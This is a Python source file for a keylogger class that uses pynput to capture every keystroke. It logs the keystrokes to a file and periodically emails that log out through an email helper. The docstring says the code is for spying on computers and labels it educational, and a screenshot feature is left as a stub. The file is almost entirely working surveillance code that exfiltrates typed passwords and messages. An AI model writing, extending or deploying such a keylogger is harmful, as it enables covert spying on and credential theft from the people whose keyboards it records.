from pynput.keyboard import Key, Listener # used to listen to keystrokes
import logging, time  # import used to log, get elapsed time
from myemail import Email

class KeyLogger:
    """
    Class used to track keystrokes and spy on computers using screenshots
    <!This is solely for educational purposes!>
        
    KeyLogger used to track keystrokes on keyboards
    to_email: email being sent to by logger
    log_email: loggers email account
    mem: string buffer to minimize logging writeouts
    start_time: time of the current logging cycle
    """
    def __init__(self, mail, email_st=120, log_ft=20, log_dir=""):
        # email obj
        self.email = mail

        # times for last updates
        self.start_time = time.time()
        self.email_time = self.start_time
        self.log_flush_time = log_ft # seconds until log flush
        self.email_send_time = email_st # seconds until email sent

        # buffer and logging config
        self.mem = []
        self.filename = "key_log.txt"
        logging.basicConfig(
            filename=(log_dir + self.filename), 
            level=logging.INFO, 
            format='%(asctime)s: %(message)s', 
        )

    def run_keylogger(self):
        """
        Runs keylogger. key_log.txt will be updated every 10 seconds and 
        """
        with Listener(on_press=self.__on_press) as listener:
            try:
                listener.join()
            except Exception:
                print("Threading error")

    def __screenshot(self):
        """
        Takes screenshot of computer
        """
        # TODO takes a screenshot of the persons screen
        return None
        
    def __on_press(self, key):
        """
        Action taken on keyboard press
        """
        c = self.__parse(str(key))
        self.mem.append(c)
        # log the data, update time and flush buffer
        if self.__check_time(self.log_flush_time, self.start_time):
            logging.info("".join(self.mem))
            self.mem.clear() 
            self.start_time = time.time()
        
        # check to see if it's time to email
        if self.__check_time(self.email_send_time, self.email_time):
            self.email.send_email_with_file(self.filename)
            self.email_time = time.time()
            # TODO rollover log
    
    def __check_time(self, check, curr_time):
        """
        private function used to decide if appropriate to continue based on time
        """
        return True if time.time() - curr_time >= check else False
    
    def __parse(self, s):
        """
        Parses the keystroke and returns appropriate keystroke back
        """
        s = s.replace("'", "")
        if "Key" in s:
            s = ' [' + s.replace("Key.", "") + '] '
        return s
